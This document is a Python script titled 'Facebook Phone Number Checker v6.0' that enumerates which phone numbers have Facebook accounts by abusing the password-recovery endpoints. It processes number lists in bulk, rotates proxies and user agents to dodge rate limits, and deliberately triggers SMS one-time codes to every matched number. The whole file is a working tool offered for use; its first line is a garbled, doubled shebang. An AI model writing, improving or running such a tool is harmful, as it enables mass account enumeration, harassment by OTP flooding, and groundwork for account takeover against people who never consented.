#!/    #!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Facebook Phone Number Checker v6.0
- Phone number existence check via password reset
- OTP trigger for valid numbers
- Multi-number support (file + interactive)
- Proxy support (HTTP/HTTPS/SOCKS)
- Colored output (green = valid, red = invalid)
- Works in Termux (Python 3.13, pure requests)
"""

import requests
import re
import json
import time
import sys
import os
import random

# ========== COLOR SETUP ==========
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

def cprint(text, color=WHITE, bold=False):
    """Print colored text"""
    if bold:
        print(f"{BOLD}{color}{text}{RESET}")
    else:
        print(f"{color}{text}{RESET}")

# ========== BANNER ==========
def show_banner():
    banner = f"""{CYAN}{BOLD}
╔══════════════════════════════════════╗
║     Facebook Phone Number Checker    ║
║           v6.0 - OTP Trigger         ║
╚══════════════════════════════════════╝{RESET}
"""
    print(banner)

# ========== USER AGENTS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.53 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 6.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungTV/6.0 Safari/537.36",
]

# ========== PROXY LOADER ==========
def load_proxies(filepath):
    """Load proxies from a file (one per line, format: http://user:pass@ip:port)"""
    proxies = []
    if not os.path.exists(filepath):
        cprint(f"[!] Proxy file not found: {filepath}", RED)
        return proxies
    try:
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if '://' not in line:
                        line = 'http://' + line
                    proxies.append(line)
        cprint(f"[+] Loaded {len(proxies)} proxies from {filepath}", GREEN)
    except Exception as e:
        cprint(f"[!] Error loading proxies: {e}", RED)
    return proxies

# ========== NUMBER LOADER ==========
def load_numbers(filepath):
    """Load phone numbers from a file (one per line)"""
    numbers = []
    if not os.path.exists(filepath):
        cprint(f"[!] File not found: {filepath}", RED)
        return numbers
    try:
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    # Remove any +, spaces, dashes
                    clean = re.sub(r'[\+\s\-\(\)]', '', line)
                    if clean:
                        numbers.append(clean)
        cprint(f"[+] Loaded {len(numbers)} numbers from {filepath}", GREEN)
    except Exception as e:
        cprint(f"[!] Error loading numbers: {e}", RED)
    return numbers

# ========== LSD TOKEN EXTRACTION ==========
def extract_lsd_token(html):
    """Extract Facebook LSD token using multiple regex patterns"""
    patterns = [
        r'"LSD",\[\],\{"token":"([^"]+)"',
        r'"token":"([a-zA-Z0-9_-]+)"',
        r'name="lsd"[^>]*value="([^"]*)"',
        r'"lsd":"([^"]+)"',
        r'\["LSD",\[\],\{"token":"([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, html)
        if match:
            token = match.group(1)
            if len(token) > 5:  # Sanity check
                return token
    return None

def extract_fb_dtsg(html):
    """Extract fb_dtsg token as fallback"""
    patterns = [
        r'name="fb_dtsg"[^>]*value="([^"]*)"',
        r'"fb_dtsg":"([^"]+)"',
        r'"fb_dtsg_token":"([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, html)
        if match:
            token = match.group(1)
            if len(token) > 5:
                return token
    return None

# ========== FACEBOOK CHECKER ==========
class FBChecker:
    def __init__(self, proxy_list=None):
        self.session = requests.Session()
        self.proxy_list = proxy_list or []
        self.proxy_index = 0
        self.lsd_token = None
        self.fb_dtsg = None
        
    def get_random_headers(self):
        """Generate random headers for each request"""
        return {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
        }
    
    def get_json_headers(self):
        """Headers for AJAX/JSON requests"""
        return {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-Friendly-Name': 'RecoverAccountSearchController',
            'X-FB-LSD': self.lsd_token or '',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.facebook.com',
            'Connection': 'keep-alive',
            'Referer': 'https://www.facebook.com/login/identify?ctx=recover',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
    
    def get_proxy(self):
        """Get next proxy from pool (round-robin)"""
        if not self.proxy_list:
            return None
        proxy = self.proxy_list[self.proxy_index % len(self.proxy_list)]
        self.proxy_index += 1
        return {'http': proxy, 'https': proxy}
    
    def refresh_tokens(self):
        """Fetch the identify page and extract LSD + fb_dtsg tokens"""
        url = 'https://www.facebook.com/login/identify?ctx=recover'
        headers = self.get_random_headers()
        proxies = self.get_proxy()
        
        try:
            resp = self.session.get(url, headers=headers, proxies=proxies, timeout=30, allow_redirects=True)
            html = resp.text
            
            # Try to extract LSD token
            lsd = extract_lsd_token(html)
            if lsd:
                self.lsd_token = lsd
                cprint(f"[✓] LSD token extracted: {lsd[:15]}...", GREEN)
            else:
                # Fallback: try fb_dtsg
                dtsg = extract_fb_dtsg(html)
                if dtsg:
                    self.lsd_token = dtsg
                    cprint(f"[✓] Using fb_dtsg as token: {dtsg[:15]}...", YELLOW)
                else:
                    cprint("[✗] Failed to extract LSD token!", RED)
                    cprint(f"[*] Response length: {len(html)} bytes", YELLOW)
                    # Save debug HTML
                    with open('debug_facebook.html', 'w', encoding='utf-8') as f:
                        f.write(html)
                    cprint("[*] Saved debug HTML to debug_facebook.html", YELLOW)
                    return False
            
            # Also save cookies from this session
            self.session.cookies.update(resp.cookies)
            return True
            
        except requests.exceptions.Timeout:
            cprint("[!] Timeout while fetching identify page", RED)
            return False
        except requests.exceptions.ProxyError:
            cprint("[!] Proxy error, trying without proxy...", RED)
            self.proxy_list = []
            return self.refresh_tokens()
        except Exception as e:
            cprint(f"[!] Error refreshing tokens: {e}", RED)
            return False
    
    def check_number(self, phone_number):
        """Check if phone number is registered and trigger OTP"""
        if not self.lsd_token:
            cprint("[!] No LSD token available. Refreshing...", YELLOW)
            if not self.refresh_tokens():
                return "error"
        
        # Clean the phone number
        phone = re.sub(r'[\+\s\-\(\)]', '', phone_number)
        
        # Step 1: POST to identify endpoint
        url = 'https://www.facebook.com/ajax/login/help/identify.php?ctx=recover'
        headers = self.get_json_headers()
        proxies = self.get_proxy()
        
        data = {
            'lsd': self.lsd_token,
            'email': phone,
            'did_submit': 'Search',
            '__user': 0,
            '__a': 1,
            '__dyn': '',
            '__csr': '',
            '__req': '',
            '__be': 0,
            '__pc': 'PHASED:DEFAULT',
            'dpr': 2,
        }
        
        try:
            resp = self.session.post(url, data=data, headers=headers, proxies=proxies, timeout=30)
            response_text = resp.text
            
            # Check response
            if 'TOKEN_ERROR' in response_text or 'lsd' in response_text.lower() and 'error' in response_text.lower():
                cprint("[!] Token expired, refreshing...", YELLOW)
                time.sleep(2)
                if self.refresh_tokens():
                    return self.check_number(phone)
                return "error"
            
            # Try to parse JSON response (Facebook wraps in for(;;);)
            json_data = None
            if response_text.startswith('for(;;);'):
                try:
                    json_data = json.loads(response_text[9:])  # Remove for(;;); prefix
                except:
                    pass
            
            if json_data:
                # Check if account found
                if 'payload' in json_data and json_data.get('payload'):
                    payload = json_data['payload']
                    if 'ldata' in payload or 'recover_uri' in payload:
                        ldata = payload.get('ldata', '')
                        recover_uri = payload.get('recover_uri', '')
                        
                        if ldata:
                            # Step 2: Navigate to recover/initiate to trigger OTP
                            return self.trigger_otp(ldata)
                        elif recover_uri:
                            # Extract ldata from recover_uri
                            ldata_match = re.search(r'ldata=([a-zA-Z0-9_-]+)', recover_uri)
                            if ldata_match:
                                return self.trigger_otp(ldata_match.group(1))
                        return "found_no_ldata"
                elif 'error' in json_data:
                    error_code = json_data['error']
                    if error_code == 1351004:  # No account found
                        return "invalid"
                    elif error_code == 1351002:  # Rate limited
                        return "ratelimit"
                    else:
                        cprint(f"[!] Unknown error code: {error_code}", YELLOW)
                        return "error"
                else:
                    cprint(f"[!] Unexpected JSON: {str(json_data)[:200]}", YELLOW)
                    return "error"
            else:
                # Try regex extraction for ldata
                ldata_match = re.search(r'ldata=([a-zA-Z0-9_-]+)', response_text)
                if ldata_match:
                    return self.trigger_otp(ldata_match.group(1))
                
                # Check for "No account" messages
                no_account_patterns = [
                    r'no (accounts?|results?) found',
                    r'couldn\'?t find',
                    r'doesn\'?t (exist|match)',
                    r'no one uses',
                    r'not registered',
                    r'enter a different',
                ]
                for pattern in no_account_patterns:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return "invalid"
                
                # Check rate limiting
                if 'please wait' in response_text.lower() or 'too many' in response_text.lower():
                    return "ratelimit"
                
                cprint(f"[!] Could not parse response. Length: {len(response_text)}", YELLOW)
                with open('debug_response.html', 'w', encoding='utf-8') as f:
                    f.write(response_text)
                cprint("[*] Saved response to debug_response.html", YELLOW)
                return "error"
                
        except requests.exceptions.Timeout:
            cprint("[!] Timeout during check", RED)
            return "error"
        except requests.exceptions.ProxyError:
            cprint("[!] Proxy failed, retrying without proxy...", RED)
            self.proxy_list = []
            return self.check_number(phone)
        except Exception as e:
            cprint(f"[!] Error checking number: {e}", RED)
            return "error"
    
    def trigger_otp(self, ldata):
        """Navigate to recover/initiate to trigger SMS OTP"""
        url = f'https://www.facebook.com/recover/initiate?ldata={ldata}'
        headers = self.get_random_headers()
        proxies = self.get_proxy()
        
        try:
            resp = self.session.get(url, headers=headers, proxies=proxies, timeout=30, allow_redirects=True)
            
            # Check if we got to the OTP page
            if 'code' in resp.text.lower() and ('send' in resp.text.lower() or 'enter' in resp.text.lower()):
                return "valid_otp"
            elif 'recover' in resp.text.lower() and ('sms' in resp.text.lower() or 'text' in resp.text.lower()):
                # Try to trigger SMS sending
                return self.send_sms_otp(ldata)
            elif resp.url and 'checkpoint' in resp.url:
                return "valid_otp"  # Account has checkpoint, means it exists
            else:
                # Still likely found - try direct SMS trigger
                return self.send_sms_otp(ldata)
                
        except Exception as e:
            cprint(f"[!] Error in OTP trigger: {e}", RED)
            return "valid_otp"  # Assume valid if we got ldata
    
    def send_sms_otp(self, ldata):
        """Try to explicitly trigger SMS OTP sending"""
        url = 'https://www.facebook.com/ajax/recover/initiate/'
        headers = self.get_json_headers()
        proxies = self.get_proxy()
        
        data = {
            'ldata': ldata,
            'lsd': self.lsd_token,
            'recover_method': 'send_sms',
            '__user': 0,
            '__a': 1,
        }
        
        try:
            resp = self.session.post(url, data=data, headers=headers, proxies=proxies, timeout=30)
            return "valid_otp"
        except:
            return "valid_otp"  # Account exists, OTP may have been sent
    
    def close(self):
        self.session.close()


# ========== MAIN FUNCTION ==========
def main():
    show_banner()
    
    import argparse
    parser = argparse.ArgumentParser(description='Facebook Phone Number Checker v6.0')
    parser.add_argument('numbers', nargs='*', help='Phone number(s) to check')
    parser.add_argument('-f', '--file', help='File containing phone numbers (one per line)')
    parser.add_argument('-p', '--proxy', help='File containing proxies (one per line)')
    parser.add_argument('-d', '--delay', type=int, default=3, help='Delay between checks in seconds (default: 3)')
    args = parser.parse_args()
    
    # Collect phone numbers
    phone_numbers = []
    
    if args.file:
        phone_numbers.extend(load_numbers(args.file))
    
    if args.numbers:
        for num in args.numbers:
            clean = re.sub(r'[\+\s\-\(\)]', '', num)
            if clean:
                phone_numbers.append(clean)
    
    # If no numbers provided, interactive mode
    if not phone_numbers:
        cprint("[*] Enter phone numbers (comma/space separated, or type 'done' to finish):", CYAN)
        while True:
            try:
                line = input(f"{CYAN}> {RESET}").strip()
                if line.lower() in ('done', 'exit', 'quit', ''):
                    break
                # Split by comma or space
                parts = re.split(r'[,;\s]+', line)
                for p in parts:
                    clean = re.sub(r'[\+\s\-\(\)]', '', p)
                    if clean:
                        phone_numbers.append(clean)
            except KeyboardInterrupt:
                print()
                break
            except EOFError:
                break
    
    if not phone_numbers:
        cprint("[!] No phone numbers provided. Exiting.", RED)
        return
    
    # Remove duplicates while preserving order
    seen = set()
    unique_numbers = []
    for num in phone_numbers:
        if num not in seen:
            seen.add(num)
            unique_numbers.append(num)
    phone_numbers = unique_numbers
    
    cprint(f"\n[+] Total unique numbers to check: {len(phone_numbers)}", CYAN)
    cprint(f"[+] Delay between checks: {args.delay}s\n", CYAN)
    
    # Load proxies if provided
    proxy_list = []
    if args.proxy:
        proxy_list = load_proxies(args.proxy)
    
    # Initialize checker
    checker = FBChecker(proxy_list)
    
    # Refresh tokens first
    cprint("[*] Initializing session and fetching LSD token...", CYAN)
    if not checker.refresh_tokens():
        cprint("[!] Failed to initialize. Retrying in 5 seconds...", YELLOW)
        time.sleep(5)
        if not checker.refresh_tokens():
            cprint("[✗] Cannot continue without LSD token. Exiting.", RED)
            return
    
    # Process each number
    results = {'valid': 0, 'invalid': 0, 'error': 0, 'ratelimit': 0}
    
    for idx, phone in enumerate(phone_numbers, 1):
        cprint(f"\n{'='*50}", CYAN)
        cprint(f"[{idx}/{len(phone_numbers)}] Checking: {phone}", WHITE, bold=True)
        
        result = checker.check_number(phone)
        
        if result == "valid_otp":
            cprint(f"[✓] {phone} → ACCOUNT FOUND + OTP TRIGGERED ✅", GREEN, bold=True)
            results['valid'] += 1
        elif result == "found_no_ldata":
            cprint(f"[✓] {phone} → ACCOUNT FOUND (OTP may have been sent) ✅", GREEN, bold=True)
            results['valid'] += 1
        elif result == "invalid":
            cprint(f"[✗] {phone} → NO ACCOUNT FOUND ❌", RED, bold=True)
            results['invalid'] += 1
        elif result == "ratelimit":
            cprint(f"[!] {phone} → RATE LIMITED, waiting longer... ⚠️", YELLOW, bold=True)
            results['ratelimit'] += 1
            time.sleep(args.delay * 2)  # Extra wait
            continue
        else:  # error
            cprint(f"[!] {phone} → ERROR ⚠️", YELLOW, bold=True)
            results['error'] += 1
        
        # Delay between checks
        if idx < len(phone_numbers):
            cprint(f"[*] Waiting {args.delay}s before next check...", CYAN)
            time.sleep(args.delay)
    
    # Summary
    cprint(f"\n{'='*50}", CYAN)
    cprint(f"{'='*50}", CYAN)
    cprint("SUMMARY", WHITE, bold=True)
    cprint(f"{'='*50}", CYAN)
    cprint(f"Total checked: {len(phone_numbers)}", WHITE)
    cprint(f"✅ Valid (Account Found + OTP): {results['valid']}", GREEN, bold=True)
    cprint(f"❌ Invalid (No Account): {results['invalid']}", RED, bold=True)
    cprint(f"⚠️  Errors: {results['error']}", YELLOW)
    cprint(f"⏳ Rate Limited: {results['ratelimit']}", YELLOW)
    cprint(f"{'='*50}\n", CYAN)
    
    checker.close()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted by user. Exiting.", YELLOW)
        sys.exit(0)
    except ImportError as e:
        cprint(f"[!] Missing module: {e}", RED)
        cprint("[*] Install with: pip install requests", YELLOW)
        sys.exit(1)
